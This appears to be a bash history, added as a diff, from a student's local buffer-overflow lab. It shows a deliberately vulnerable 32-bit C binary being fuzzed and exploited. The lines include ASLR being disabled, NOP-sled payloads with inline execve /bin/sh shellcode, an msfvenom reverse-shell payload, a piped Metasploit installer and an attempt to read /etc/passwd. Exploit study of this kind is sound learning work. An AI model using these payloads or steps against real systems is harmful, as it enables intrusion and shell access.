@@ -1,0 +1,234 @@
+sudo apt-get update
+apt
+sudo apt install build-essential python gdb git github
+github
+sudo apt install build-essential python gdb git
+ssh-keygen -t ed25519 -C "github@javierlopezgonzalez.es"
+eval "~ssh-agent -s)"
+eval "$(ssh-agent -s)"
+ssh-add ~/.ssh/id_ed25519
+cat ~/.ssh/id_ed25519.pub
+git clone git@github.com:JaviLopezg/dps.git
+ls
+sudo apt install openssh-server
+sudo systemctl status ssh
+sudo shutdown -h now
+eval "$(ssh-agent -s)"
+ssh-add ~/.ssh/id_ed25519
+cat ~/.ssh/id_ed25519.pub
+git clone git@github.com:JaviLopezG/dps.git
+ls
+cd dps
+cd mkdir overflow
+mkdir overflow
+cd overflow
+wget -O ~/.gdbinit-gef.py https://gef.blah.cat/py
+echo source ~/.gdbinit-gef.py >> ~/.gdbinit
+gdb
+rm ~/.gdbinit-gef.py
+wget -O ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/26ad93722a274640d25e4c637ec68962c431428e/gef.py
+gdb
+cat /proc/sys/kernel/randomize_space
+cat /proc/sys/kernel/randomize_va_space
+sudo sysctl -w kernel.randomize_va_space=0
+cat /proc/sys/kernel/randomize_va_space
+sudo apt install libc6-dev-i386
+vi vulnerable.c
+gcc -m32 -no-pie -fno-stack-protector -z execstack vulnerable.c -o vulnerable
+ls
+vi fuzzer.py
+python3 fuzzer.py
+./vulnerable
+./vulnerable AA
+./vulnerable AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+vi fuzzer.py
+python3 fuzzer.py 
+vi fuzzer.py
+clear
+python3 fuzzer.py 
+cat vulnerable.c 
+cat fuzzer.py 
+python3 -c 'print("A" * 132 + "B" * 4)' > prueba_eip.txt
+gdb ./vulnerable 
+cd
+ls
+ls -al
+cat .gdbinit
+head .gdbinit-gef.py
+cat .gdbinit-gef.py|head
+cat .gdbinit-gef.py
+wget -O ~/.gdbinit-gef.py https://gef.blah.cat/py
+ls -al
+cd dps
+cd overflow/
+ls
+gdb vulnerable 
+cd 
+head .gdbinit-gef.py
+vi .gdbinit-gef.py 
+rm .gdbinit-gef.py 
+wget -O ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/26ad93722a274640d25e4c637ec68962c431428e/gef.py
+git clone https://github.com/hugsy/gef.git ~/gef
+ls gef
+vi .gdbinit
+cd dps
+cd overflow/
+gdb vulnerable 
+cd
+git clone https://github.com/longld/peda.git ./peda
+vi .gdbinit
+cd dps
+cd overflow/
+ls
+gdb vulnerable 
+gcc -m32 -no-pie -fno-stack-protector -z execstack -g vulnerable.c -o vulnerable
+gdb vulnerable 
+python3 -c 'print("A" * 132 + "B" * 4 + "C" * 4)'> prueba_eip2.txt
+gdb vulnerable 
+python3 -c 'print("A" * 132 + "B" * 4 + "C" * 4 + "D" * 4)'> prueba_eip3.txt
+gdb vulnerable 
+ls
+cat prueba_eip.txt
+python3 -c 'print("\x90" * 100 + "W" * 20 + "A" * 20 + "X" * 4)' > prueba_dir.txt
+gdb vulnerable 
+cat prueba_dir
+cat prueba_dir.
+cat prueba_dir.txt 
+ls
+ls -al
+cat prueba_dir.txt 
+vi prueba_dir.txt 
+python3 -c 'print(chr(int(90, 16)) * 100 + "W" * 20 + "A" * 20 + "X" * 4)' > prueba_dir2.txt
+python3 -c 'print(chr(int("90", 16)) * 100 + "W" * 20 + "A" * 20 + "X" * 4)' > prueba_dir2.txt
+cat prueba_dir2.txt 
+vi prueba_dir2.txt 
+gdb vulnerable 
+python3 -c 'import sys; sys.stdout.buffer.write(b"\x90" * 100 + b"W" * 20 + b"A" * 20 + b"D" * 4)' > prueba_dir_bin
+cat prueba_dir_bin 
+vi prueba_dir_bin 
+gdb vulnerable 
+python3 -c 'import sys; sys.stdout.buffer.write(b"\x90" * 140 + b"\xb0\xd3\xff\xff")' > exploit
+cat exploit 
+gdb vulnerable 
+./vulnerable exploit
+sudo apt msfvenom
+sudo apt install msfvenom
+git clone https://github.com/g0tmi1k/msfpc.git
+ls
+cat peda-
+cat peda-session-vulnerable.txt 
+cd msfpc/
+ls
+cat msfpc.sh 
+md5sum
+md5sum msfpc.sh 
+cd ..
+mkdir metasploit
+cd metasploit/
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall &&   chmod 755 msfinstall &&   ./msfinstall
+cd ..
+git add *
+git rm --cached overflow/msfpc
+git rm --cached overflow/msfpc*
+rm -rf msfpc/
+rm -rf metasploit/
+git add *
+git commit -m "Hecho exploit funcional a falta de payload"
+git config --global user.email "github@javierlopezgonzalez.es"
+git config --global user.name "JaviLopezG"
+git commit -m "Hecho exploit funcional a falta de payload"
+git push
+msfvenom
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python -b '\x00\x0a\x0d'
+vi crear_exploit.py
+python3 crear_exploit.py 
+python3 crear_exploit.py > exploitwload
+./vulnerable exploitwload 
+python3 -c 'import sys; sys.stdout.buffer.write(b"\x90" * 112 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + b"\xb0\xd3\xff\xff")' > exploit_final
+./vulnerable exploit_final 
+cat crear_exploit.py 
+./vulnerable $(exploitwload)
+./vulnerable $(cat exploitwload)
+./vulnerable $(cat exploit_final)
+gdb vulnerable 
+python3 -c 'import sys; sys.stdout.buffer.write(b"\x90" * 112 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + b"\xd1\xd3\xff\xff")' > exploit_final2
+./vulnerable $(cat exploit_final2)
+gdb vulnerable 
+vi exploit_final_v2.py
+./vulnerable $(python3 exploit_final_v2.py)
+gdb
+gdb ./vulnerable 
+./vulnerable $(python3 exploit_final_v2.py)
+vi exploit_final_v3.py
+python3 exploit_final_v3.py > exploit_final_v3
+./vulnerable $(cat exploit_final_v3)
+gdb vulnerable 
+vi exploit_final_v4.py
+python3 exploit_final_v4.py > exploit_final_v4
+./vulnerable $(cat 
+
+./vulnerable $(cat exploit_final_v4)
+gdb vulnerable 
+ls
+ls -al
+cat peda-session-dash.txt 
+mkdir pruebas-fallidas
+mv exploit* pruebas-fallidas/
+mv prueba_* pruebas-fallidas/
+ls
+ls -al
+vi crear_exploit.py 
+python3 crear_exploit.py > exp_loaded
+./vulnerable $(cat exp_loaded)
+gdb vulnerable 
+nc --help
+nc -h
+./vulnerable $(cat exp_loaded)
+gdb vulnerable 
+./vulnerable "$(cat exp_loaded)"
+mv pruebas-fallidas/exploit_final_v4.py ./exploit_final_v4.py
+ls
+python3 exploit_final_v4.py > exp_shell
+./vulnerable "$(cat exp_shell)"
+gdb vulnerable 
+ls
+vi crear_exploit.py 
+python3 crear_exploit.py > exp_loaded_4a
+./vulnerable $(cat exp_loaded_4a)
+vi crear_exploit.py 
+python3 crear_exploit.py > exp_loaded_4m
+./vulnerable $(cat exp_loaded_4m)
+vi crear_exploit.py 
+python3 crear_exploit.py > exp_loaded_8m
+./vulnerable $(cat exp_loaded_8m)
+vi crear_exploit.py 
+python3 crear_exploit.py > exp_loaded_8a
+./vulnerable $(cat exp_loaded_8a)
+cat /etc/passwd
+git commit -m "Funcionan los payload tanto de shell como de reverse shell (metasploit) pero sólo dentro de gdb."
+git add *
+git commit -m "Funcionan los payload tanto de shell como de reverse shell (metasploit) pero sólo dentro de gdb."
+git push
+./vulnerable $(cat exp_loaded_8a)
+./vulnerable $(cat exp_loaded_8m)
+./vulnerable $(cat exp_loaded_4m)
+./vulnerable $(cat exp_loaded_4a)
+mkdir soluciones-gdb
+ls
+mv *.py soluciones-gdb/
+mv exp* soluciones-gdb/
+ls
+vi exploit_read_passwd.py
+./vulnerable
+./vulnerable $(python3 exploit_read_passwd.py)
+gdb vulnerable 
+vi exploit_ret2esp_final.py
+./vulnerable $(python3 exploit_ret2esp_final.py)
+gdb vulnerable 
+git add *
+git commit -m "Pruebas con payload para leer /etc/passwd, se ejecuta pero no acaba. También probado un salto aleatorio a la desesperada :)"
+git push
+ls -al ~
+cat /.bash_history
+cat ~/.bash_history
+exit
